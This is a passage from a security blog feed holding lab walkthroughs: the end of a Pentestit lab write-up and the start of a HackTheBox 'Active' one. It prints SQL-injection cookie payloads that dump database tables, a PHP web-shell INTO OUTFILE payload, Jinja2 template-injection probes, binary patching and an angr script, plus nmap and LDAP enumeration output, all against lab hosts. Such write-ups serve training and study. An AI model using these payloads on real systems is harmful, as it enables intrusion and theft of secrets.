Hacker?\&quot;,\&quot;Yes\&quot;,\&quot;No\&quot;],[\&quot;ALL_PLUGINS\&quot;],[\&quot;APPLICABLE_ROLES\&quot;],[\&quot;CHARACTER_SETS\&quot;],[\&quot;COLLATIONS\&quot;],[\&quot;COLLATION_CHARACTER_SET_APPLICABILITY\&quot;],[\&quot;COLUMNS\&quot;],[\&quot;COLUMN_PRIVILEGES\&quot;],[\&quot;ENABLED_ROLES\&quot;],[\&quot;ENGINES\&quot;],[\&quot;EVENTS\&quot;],[\&quot;FILES\&quot;],[\&quot;GLOBAL_STATUS\&quot;],[\&quot;GLOBAL_VARIABLES\&quot;],[\&quot;KEY_CACHES\&quot;],[\&quot;KEY_COLUMN_USAGE\&quot;],[\&quot;PARAMETERS\&quot;],[\&quot;PARTITIONS\&quot;],[\&quot;PLUGINS\&quot;],[\&quot;PROCESSLIST\&quot;],[\&quot;PROFILING\&quot;],[\&quot;REFERENTIAL_CONSTRAINTS\&quot;],[\&quot;ROUTINES\&quot;],[\&quot;SCHEMATA\&quot;],[\&quot;SCHEMA_PRIVILEGES\&quot;],[\&quot;SESSION_STATUS\&quot;],[\&quot;SESSION_VARIABLES\&quot;],[\&quot;STATISTICS\&quot;],[\&quot;SYSTEM_VARIABLES\&quot;],[\&quot;TABLES\&quot;],[\&quot;TABLESPACES\&quot;],[\&quot;TABLE_CONSTRAINTS\&quot;],[\&quot;TABLE_PRIVILEGES\&quot;],[\&quot;TRIGGERS\&quot;],[\&quot;USER_PRIVILEGES\&quot;],[\&quot;VIEWS\&quot;],[\&quot;GEOMETRY_COLUMNS\&quot;],[\&quot;SPATIAL_REF_SYS\&quot;],[\&quot;CLIENT_STATISTICS\&quot;],[\&quot;INDEX_STATISTICS\&quot;],[\&quot;INNODB_SYS_DATAFILES\&quot;],[\&quot;TABLE_STATISTICS\&quot;],[\&quot;INNODB_SYS_TABLESTATS\&quot;],[\&quot;USER_STATISTICS\&quot;],[\&quot;INNODB_SYS_INDEXES\&quot;],[\&quot;XTRADB_RSEG\&quot;],[\&quot;INNODB_CMP_PER_INDEX\&quot;],[\&quot;INNODB_TRX\&quot;],[\&quot;CHANGED_PAGE_BITMAPS\&quot;],[\&quot;INNODB_FT_BEING_DELETED\&quot;],[\&quot;INNODB_LOCK_WAITS\&quot;],[\&quot;INNODB_LOCKS\&quot;],[\&quot;INNODB_TABLESPACES_ENCRYPTION\&quot;],[\&quot;XTRADB_INTERNAL_HASH_TABLES\&quot;],[\&quot;INNODB_SYS_FIELDS\&quot;],[\&quot;INNODB_CMPMEM_RESET\&quot;],[\&quot;INNODB_CMP\&quot;],[\&quot;INNODB_FT_INDEX_TABLE\&quot;],[\&quot;INNODB_SYS_TABLESPACES\&quot;],[\&quot;INNODB_MUTEXES\&quot;],[\&quot;INNODB_BUFFER_PAGE_LRU\&quot;],[\&quot;INNODB_SYS_FOREIGN_COLS\&quot;],[\&quot;INNODB_CMP_RESET\&quot;],[\&quot;INNODB_BUFFER_POOL_STATS\&quot;],[\&quot;INNODB_FT_INDEX_CACHE\&quot;],[\&quot;INNODB_SYS_FOREIGN\&quot;],[\&quot;INNODB_METRICS\&quot;],[\&quot;INNODB_FT_DEFAULT_STOPWORD\&quot;],[\&quot;INNODB_CMPMEM\&quot;],[\&quot;INNODB_SYS_TABLES\&quot;],[\&quot;INNODB_SYS_COLUMNS\&quot;],[\&quot;INNODB_FT_CONFIG\&quot;],[\&quot;INNODB_BUFFER_PAGE\&quot;],[\&quot;INNODB_CMP_PER_INDEX_RESET\&quot;],[\&quot;XTRADB_READ_VIEW\&quot;],[\&quot;INNODB_SYS_SEMAPHORE_WAITS\&quot;],[\&quot;INNODB_CHANGED_PAGES\&quot;],[\&quot;INNODB_FT_DELETED\&quot;],[\&quot;INNODB_TABLESPACES_SCRUBBING\&quot;],[\&quot;token\&quot;],[\&quot;wp_commentmeta\&quot;],[\&quot;wp_comments\&quot;],[\&quot;wp_links\&quot;],[\&quot;wp_options\&quot;],[\&quot;wp_postmeta\&quot;],[\&quot;wp_posts\&quot;],[\&quot;wp_term_relationships\&quot;],[\&quot;wp_term_taxonomy\&quot;],[\&quot;wp_termmeta\&quot;],[\&quot;wp_terms\&quot;],[\&quot;wp_usermeta\&quot;],[\&quot;wp_users\&quot;],[\&quot;wp_wp_sap_answers\&quot;],[\&quot;wp_wp_sap_questions\&quot;],[\&quot;wp_wp_sap_surveys\&quot;]]}&quot;}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;By looking at the above output, the table “token” stands out. Any columns belonging to this table can be identified using the below SQL Injection payload.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; Cookie: wp_sap=[&quot;1650149780')) OR 1=2 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,column_name,11 from information_schema.columns where table_name = 'token'#&quot;]
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;This gives us information regarding a column called “name” existing within the “token” table.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  var sss_params = {&quot;survey_options&quot;:&quot;{\&quot;options\&quot;:\&quot;[\\\&quot;bottom\\\&quot;,\\\&quot;easeInOutBack\\\&quot;,\\\&quot;\\\&quot;,\\\&quot;linear-gradient(top, rgb(228, 228, 228) 35%, rgb(228, 228, 228) 70%); -o-linear-gradient(top, rgb(228, 228, 228) 35%, rgb(228, 228, 228) 70%); -ms-linear-gradient(top, rgb(228, 228, 228) 35%, rgb(228, 228, 228) 70%); -moz-linear-gradient(top, rgb(228, 228, 228) 35%, rgb(228, 228, 228) 70%); -webkit-linear-gradient(top, rgb(228, 228, 228) 35%, rgb(228, 228, 228) 70%);\\\&quot;,\\\&quot;rgb(81, 81, 81)\\\&quot;,\\\&quot;rgb(188, 188, 188)\\\&quot;,\\\&quot;1\\\&quot;,\\\&quot;5\\\&quot;,\\\&quot;20\\\&quot;,\\\&quot;20\\\&quot;,\\\&quot;20\\\&quot;,1000,\\\&quot;So, mr. Hacker, the die is cast.\\\&quot;,\\\&quot;0\\\&quot;,\\\&quot;1\\\&quot;,\\\&quot;0\\\&quot;]\&quot;,\&quot;plugin_url\&quot;:\&quot;http:\\\/\\\/site.test.lab\\\/wp-content\\\/plugins\\\/wp-survey-and-poll\&quot;,\&quot;admin_url\&quot;:\&quot;http:\\\/\\\/site.test.lab\\\/wp-admin\\\/admin-ajax.php\&quot;,\&quot;survey_id\&quot;:\&quot;242178939\&quot;,\&quot;style\&quot;:\&quot;modal\&quot;,\&quot;expired\&quot;:\&quot;false\&quot;,\&quot;debug\&quot;:\&quot;true\&quot;,\&quot;questions\&quot;:[[\&quot;Ready to show who is mr. Hacker?\&quot;,\&quot;Yes\&quot;,\&quot;No\&quot;],[\&quot;name\&quot;]]}&quot;};
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;This column can now be queried directly to find the Site token.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pentestit/21.jpg&quot; alt=&quot;alt text&quot; title=&quot;site1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Other payloads such as &lt;code class=&quot;highlighter-rouge&quot;&gt;UNION ALL SELECT 1,&amp;lt;?php echo shell_exec($_GET['cmd'])?&amp;gt;,3,4,5,6,7,8,9,10,11 into OUTFILE  '/var/www/shell.php' #&lt;/code&gt; was tried to possibly execute code on the system through SQL Injection. But, this was found to be not possible.&lt;/p&gt;

&lt;h3 id=&quot;my-token&quot;&gt;My Token&lt;/h3&gt;

&lt;p&gt;Looking at the previously obtained DNS names from the DNS token, the following IP address corresponds to my.test.lab.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;my.test.lab.		21600	IN	A	172.16.0.10
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;A quick nmap reveals a web server to be present on port 80.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Downloads# nmap -sS -n 172.16.0.10
Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-09 18:14 EDT
Nmap scan report for 172.16.0.10
Host is up (0.060s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 12.30 seconds
root@kali:~/Downloads# 
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Visiting the webserver using a web browser shows the following login page.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pentestit/22.jpg&quot; alt=&quot;alt text&quot; title=&quot;my1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It was possible to login to this web application using the previously found ‘info’ user credentials with the password ‘123456789’.&lt;/p&gt;

&lt;p&gt;After examining the page, it looks like the application is vulnerable to Server Side Template Injection (SSTI). Server Side Template Injection is possible when an attacker can inject template directive as user input that can execute arbitrary code on the server. Some popular and widely used template engines are Smarty, Twig, Jinja2, FreeMarker, Velocity. More information regarding this vulnerability can be found here: https://portswigger.net/blog/server-side-template-injection&lt;/p&gt;

&lt;p&gt;Presence of this vulnerability can be successfully identified by inserting a payload such as ‘{{11*2}}’ which evaluates to 22.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pentestit/23.jpg&quot; alt=&quot;alt text&quot; title=&quot;my2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The tool tplmap was used to quickly exploit this vulnerability however that was found to be not possible.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/tplmap# ./tplmap.py -u 'http://my.test.lab/?q=kk'
[+] Tplmap 0.5
    Automatic Server-Side Template Injection Detection and Exploitation Tool

[+] Testing if GET parameter 'q' is injectable
[+] Smarty plugin is testing rendering with tag '*'
[+] Smarty plugin is testing blind injection
[+] Mako plugin is testing rendering with tag '${*}'
[+] Mako plugin is testing blind injection
[+] Python plugin is testing rendering with tag 'str(*)'
[+] Python plugin is testing blind injection
[+] Tornado plugin is testing rendering with tag ''
[+] Tornado plugin is testing blind injection
[+] Jinja2 plugin is testing rendering with tag ''
[+] Jinja2 plugin is testing blind injection
[+] Twig plugin is testing rendering with tag ''
[+] Twig plugin is testing blind injection
[+] Freemarker plugin is testing rendering with tag '*'
[+] Freemarker plugin is testing blind injection
[+] Velocity plugin is testing rendering with tag '*'
[+] Velocity plugin is testing blind injection
[+] Slim plugin is testing rendering with tag '&quot;#{*}&quot;'
[+] Slim plugin is testing blind injection
[+] Erb plugin is testing rendering with tag '&quot;#{*}&quot;'
[+] Erb plugin is testing blind injection
[+] Pug plugin is testing rendering with tag '\n= *\n'
[+] Pug plugin is testing blind injection
[+] Nunjucks plugin is testing rendering with tag ''
[+] Nunjucks plugin is testing blind injection
[+] Dot plugin is testing rendering with tag ''
[+] Dot plugin is testing blind injection
[+] Dust plugin is testing rendering
[+] Dust plugin is testing blind injection
[+] Marko plugin is testing rendering with tag '${*}'
[+] Marko plugin is testing blind injection
[+] Javascript plugin is testing rendering with tag '*'
[+] Javascript plugin is testing blind injection
[+] Php plugin is testing rendering with tag '*'
[+] Php plugin is testing blind injection
[+] Ruby plugin is testing rendering with tag '&quot;#{*}&quot;'
[+] Ruby plugin is testing blind injection
[+] Ejs plugin is testing rendering with tag '*'
[+] Ejs plugin is testing blind injection
[!][checks] Tested parameters appear to be not injectable
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;After looking through tplmap’s source code and by reading through the great methodology given by James Kettle of Portswigger (https://portswigger.net/blog/server-side-template-injection), the following can be done to identify what template is in use.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://portswigger.net/cms/images/migration/blog/screen-shot-2015-07-20-at-09-21-56.png&quot; alt=&quot;alt text&quot; title=&quot;my3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;By following the above methodology, it is possible to identify that the template in use in Jinja2 since it evaluates ‘{{7*‘7’}}’ to 7777777.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pentestit/24.jpg&quot; alt=&quot;alt text&quot; title=&quot;my2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Knowing that, enumeration of the application can now begin. The following global variables are available within Jinja2 templates by default:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;config&lt;/code&gt; - the current configuration object&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;request&lt;/code&gt; - the current request object&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;session&lt;/code&gt; - the current session object&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;g&lt;/code&gt; - the request-bound object for global variables. This is usually used by the developer to store resources during a request.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The configuration object can be called to retrieve the secret key used by the Jinja template. The Secret Key ‘UGhldmJoZj8gYWl2ZnZoei5wYnovcG5lcnJlZg==’ is the My token.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pentestit/25.jpg&quot; alt=&quot;alt text&quot; title=&quot;my4&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;reverse-token&quot;&gt;Reverse Token&lt;/h3&gt;

&lt;p&gt;Examining the file downloaded from &lt;code class=&quot;highlighter-rouge&quot;&gt;repository.test.lab&lt;/code&gt;, it looks to be an executable.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Downloads# file bin
bin: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=119ea32cf92d114f4c938989562717e2451414d9, not stripped
root@kali:~/Downloads# strings bin
/lib64/ld-linux-x86-64.so.2
libc.so.6
__isoc99_scanf
puts
printf
__cxa_finalize
__libc_start_main
_ITM_deregisterTMCloneTable
__gmon_start__
_Jv_RegisterClasses
_ITM_registerTMCloneTable
GLIBC_2.7
GLIBC_2.2.5
AWAVA
AUATL
[]A\A]A^A_
PASSWORD: 
%32s
ACCESS GRANTED!
ACCESS DENIED!
;*3$&quot;
qk0Q5ZmS3au5RkcPuyotTjtg3G0bux3r
Qn8AiYpfA4rPUrL9Oxn1ET5vG8h7o7xb
a1aX9SLLbe3Fksvqtv7YhRoqtaw91ezu
nFb4dqPjHNnUoGJhC9u7gBdb9YWyCBxL
HNnwB0GQNeVL5CGzMWjpuKfxDfqVPb1K
3Z95TWpP8AjUCROxVRWwdciYZeALUOdX
s9ZYhZfC1QJ648ks4T2osoLzdFizYgTN
iAp6GHesRyGqYFR2nrI6eVsRBCg8wwuC
kheitdX7MaAJUmiUcCKyRY8S3OCL6EYU
ZGu3qyV3h0SjtvcXydEFkDAY614ag0Wz
Qm0WDrht1fHYMCwNJMX7JzyJZgs4uT44
fMbNVxtoCJPmqaioEFrCNCAqUJJey5t5
9gnkzkuM7bp3nYaqneAL5PErwSZoDdHR
pDCZ4rifJzZbXC3JCcdG8VXm4sb2dUHg
cmHunusgo6mLm1k2mECv4twf9NFotmh0
SH09vwZGljB1gBuxiEEWBVAyoEtMMfwH
AWBbrLGVxIxW3SwxdLzGaJtwnTPkS0CI
BEE08jI0dF1WwDZZjTMS3wnR8gn1Yl0P
2wI2d3MAhcASlc7Jh3glOlRzHsCP6aYG
PRkuaCnSV6PvKZR69c6ZdZmmSXcJhXaI
fV3Z3hTeDSkDcB3tA6ErgkfACczshjOk
RG2UK0t01h6Iu1mYoYNMwaDYOFLDdKbb
h5RsV2d5xxvva4hNQCKAeImgyYv2VGsn
U2UBCWM6LMfjTrPViCvE2iCoy2HFGlZu
1E0kpCL4HsvT08R7MS1b7QOHmGjPRjej
5rHeHjWfheNpO6fOcRKo8UaBIYy5Elmm
9hNjolVactGp6W2ANee4x3TqQbhomXDC
jxV1ieQfSW7jJBcBCNeEDy0tN0WKUzkX
ZQ6jg2CvZYAIr5jJUqoPBoKmgKEvbc2J
bPnjBvCFSJOWjZQ4YTt8yl9Qg2iZ4BjC
gamRgM6VyyM9UyvaigVutUkAo9xWcUmb
zAICHvw3womkL80wKKeJG5nbkQR0ziw7
GCC: (Debian 6.3.0-18+deb9u1) 6.3.0 20170516
crtstuff.c
__JCR_LIST__
deregister_tm_clones
__do_global_dtors_aux
completed.6972
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
crme.c
__FRAME_END__
__JCR_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
puts@@GLIBC_2.2.5
_edata
printf@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
check_pw
__bss_start
main
_Jv_RegisterClasses
__isoc99_scanf@@GLIBC_2.7
__TMC_END__
_ITM_registerTMCloneTable
__cxa_finalize@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.jcr
.dynamic
.got.plt
.data
.bss
.comment

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Binary Ninja can be used to disassemble the binary and understand it better. Looking at the disassembled binary in graph view, it is expecting user input as a value password and is executing a function called &lt;code class=&quot;highlighter-rouge&quot;&gt;check_pw&lt;/code&gt; and depending on the output and if the user value and password matches, they are sent to the correct branch.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pentestit/reverse1.png&quot; alt=&quot;alt text&quot; title=&quot;reverse1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Looking at the &lt;code class=&quot;highlighter-rouge&quot;&gt;check_pw&lt;/code&gt; function, the comparison of the user value and password value can be seen.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pentestit/reverse2.png&quot; alt=&quot;alt text&quot; title=&quot;reverse2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;JE&lt;/code&gt; (Jump Equal) function can be modified to &lt;code class=&quot;highlighter-rouge&quot;&gt;JNE&lt;/code&gt; (Jump not Equal) to match the condition to be true even if a wrong password is provided.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pentestit/reverse3.png&quot; alt=&quot;alt text&quot; title=&quot;reverse3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Running the binary again, the access is granted however a token is not provided.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pentestit/reverse4.png&quot; alt=&quot;alt text&quot; title=&quot;reverse4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Since the condition of this executable is based on a simple compare function, symbolic execution could be used to grant access to this binary. Symbolic execution (also symbolic evaluation) is a means of analyzing a program to determine what inputs cause each part of a program to execute. &lt;a href=&quot;https://github.com/angr/angr&quot;&gt;angr&lt;/a&gt; can be used to solve this. angr is a binary analysis platform written by the Computer Security Lab at UC Santa Barbara, SEFCOM at Arizona State University, and their associated CTF team, Shellphish for CTFs.&lt;/p&gt;

&lt;p&gt;Looking at angr documentation &lt;a href=&quot;https://docs.angr.io/core-concepts/pathgroups&quot;&gt;https://docs.angr.io/core-concepts/pathgroups&lt;/a&gt;, the following code can be used on the executable.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import angr

project = angr.Project(&quot;./bin&quot;)
simgr = project.factory.simgr()
simgr.explore(find=lamda s: b&quot;ACCESS GRANTED!&quot; in s.posix.dumps(1)
s = simgr.found[0]
print(s.posix.dumps(0))
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;By running the Simulation manager, the “ACCESS GRANTED” state can be achieved and the reverse token can be obtained.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pentestit/reverse5.png&quot; alt=&quot;alt text&quot; title=&quot;reverse5&quot; /&gt;&lt;/p&gt;
</description>
        <pubDate>Mon, 21 Jan 2019 09:00:00 +0000</pubDate>
        <link>http://snoopysecurity.github.io/netsec/2019/01/21/10_pentestit_v12_walkthrough.html</link>
        <guid isPermaLink="true">http://snoopysecurity.github.io/netsec/2019/01/21/10_pentestit_v12_walkthrough.html</guid>
        
        <category>pentestit</category>
        
        
        <category>netsec</category>
        
      </item>
    
      <item>
        <title>HackTheBox : Active Walkthrough</title>
        <description>&lt;p&gt;This walkthrough is a guide on how to exploit HTB Active machine. A quick nmap scan of the target system reveals the following information. The arguement &lt;code class=&quot;highlighter-rouge&quot;&gt;-p-&lt;/code&gt; can also be used to scan the entire port range upto 65536&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Downloads# nmap -sV 10.10.10.100 -n -sC -Pn -vvv
Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-21 16:23 EDT
NSE: Loaded 148 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 16:26
Completed NSE at 16:26, 0.29s elapsed
Nmap scan report for 10.10.10.100
Host is up, received user-set (0.055s latency).
Scanned at 2019-06-21 16:23:12 EDT for 215s
Not shown: 983 closed ports
Reason: 983 resets
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2019-06-21 20:17:10Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (c)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
49152/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49155/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49157/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -6m20s, deviation: 0s, median: -6m20s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 8052/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 40109/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 20043/udp): CLEAN (Timeout)
|   Check 4 (port 38631/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2019-06-21 16:18:12
|_  start_date: 2019-06-21 07:26:26

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 16:26
Completed NSE at 16:26, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 16:26
Completed NSE at 16:26, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 214.99 seconds
           Raw packets sent: 1344 (59.136KB) | Rcvd: 1001 (40.108KB)

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Looking at the provided LDAP information, it can be deduced that DNS name for this machine is active.htb. This can be added to your hosts file. It is also obvious that by the services open such as DNS, LDAP and Kerberos, this is a domain controller&lt;/p&gt;

&lt;h3 id=&quot;ldap-enumeration&quot;&gt;LDAP Enumeration&lt;/h3&gt;

&lt;p&gt;Since LDAP is open, enumeration can be conduced on this service.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Downloads# nmap -p 389 --script ldap-rootdse active.htb
Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-22 16:58 EDT
Nmap scan report for active.htb (10.10.10.100)
Host is up (0.057s latency).

PORT    STATE SERVICE
389/tcp open  ldap
| ldap-rootdse: 
| LDAP Results
|   &amp;lt;ROOT&amp;gt;
|       currentTime: 20190622205142.0Z
|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=active,DC=htb
|       dsServiceName: CN=NTDS Settings,CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=active,DC=htb
|       namingContexts: DC=active,DC=htb
|       namingContexts: CN=Configuration,DC=active,DC=htb
|       namingContexts: CN=Schema,CN=Configuration,DC=active,DC=htb
|       namingContexts: DC=DomainDnsZones,DC=active,DC=htb
|       namingContexts: DC=ForestDnsZones,DC=active,DC=htb
|       defaultNamingContext: DC=active,DC=htb
|       schemaNamingContext: CN=Schema,CN=Configuration,DC=active,DC=htb
|       configurationNamingContext: CN=Configuration,DC=active,DC=htb
|       rootDomainNamingContext: DC=active,DC=htb
|       supportedControl: 1.2.840.113556.1.4.319
|       supportedControl: 1.2.840.113556.1.4.801
|       supportedControl: 1.2.840.113556.1.4.473
|       supportedControl: 1.2.840.113556.1.4.528
|       supportedControl: 1.2.840.113556.1.4.417
|       supportedControl: 1.2.840.113556.1.4.619
|       supportedControl: 1.2.840.113556.1.4.841
|       supportedControl: 1.2.840.113556.1.4.529
|       supportedControl: 1.2.840.113556.1.4.805
|       supportedControl: 1.2.840.113556.1.4.521
|       supportedControl: 1.2.840.113556.1.4.970
|       supportedControl: 1.2.840.113556.1.4.1338
|       supportedControl: 1.2.840.113556.1.4.474
|       supportedControl: 1.2.840.113556.1.4.1339
|       supportedControl: 1.2.840.113556.1.4.1340
|       supportedControl: 1.2.840.113556.1.4.1413
|       supportedControl: 2.16.840.1.113730.3.4.9
|       supportedControl: 2.16.840.1.113730.3.4.10
|       supportedControl: 1.2.840.113556.1.4.1504
|       supportedControl: 1.2.840.113556.1.4.1852
|       supportedControl: 1.2.840.113556.1.4.802
|       supportedControl: 1.2.840.113556.1.4.1907
|       supportedControl: 1.2.840.113556.1.4.1948
|       supportedControl: 1.2.840.113556.1.4.1974
|       supportedControl: 1.2.840.113556.1.4.1341
|       supportedControl: 1.2.840.113556.1.4.2026
|       supportedControl: 1.2.840.113556.1.4.2064
|       supportedControl: 1.2.840.113556.1.4.2065
|       supportedControl: 1.2.840.113556.1.4.2066
|       supportedLDAPVersion: 3
|       supportedLDAPVersion: 2
|       supportedLDAPPolicies: MaxPoolThreads
|       supportedLDAPPolicies: MaxDatagramRecv
|       supportedLDAPPolicies: MaxReceiveBuffer
|       supportedLDAPPolicies: InitRecvTimeout
|       supportedLDAPPolicies: MaxConnections
|       supportedLDAPPolicies: MaxConnIdleTime
|       supportedLDAPPolicies: MaxPageSize
|       supportedLDAPPolicies: MaxQueryDuration
|       supportedLDAPPolicies: MaxTempTableSize
|       supportedLDAPPolicies: MaxResultSetSize
|       supportedLDAPPolicies: MinResultSets
|       supportedLDAPPolicies: MaxResultSetsPerConn
|       supportedLDAPPolicies: MaxNotificationPerConn
|       supportedLDAPPolicies: MaxValRange
|       supportedLDAPPolicies: ThreadMemoryLimit
|       supportedLDAPPolicies: SystemMemoryLimitPercent
|       highestCommittedUSN: 90299
|       supportedSASLMechanisms: GSSAPI
|       supportedSASLMechanisms: GSS-SPNEGO
|       supportedSASLMechanisms: EXTERNAL
|       supportedSASLMechanisms: DIGEST-MD5
|       dnsHostName: DC.active.htb
|       ldapServiceName: active.htb:dc$@ACTIVE.HTB
|       serverName: CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=active,DC=htb
|       supportedCapabilities: 1.2.840.113556.1.4.800
|       supportedCapabilities: 1.2.840.113556.1.4.1670
|       supportedCapabilities: 1.2.840.113556.1.4.1791
|       supportedCapabilities: 1.2.840.113556.1.4.1935
|       supportedCapabilities: 1.2.840.113556.1.4.2080
|       isSynchronized: TRUE
|       isGlobalCatalogReady: TRUE
|       domainFunctionality: 4
|       forestFunctionality: 4
|_      domainControllerFunctionality: 4
Service Info: Host: DC; OS: Windows 2008 R2
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Root Directory Server Agent Service Entry or RootDSE is usually provided LDAP servers and they must provide information about itself and other information that is specific to each server.&lt;/p&gt;

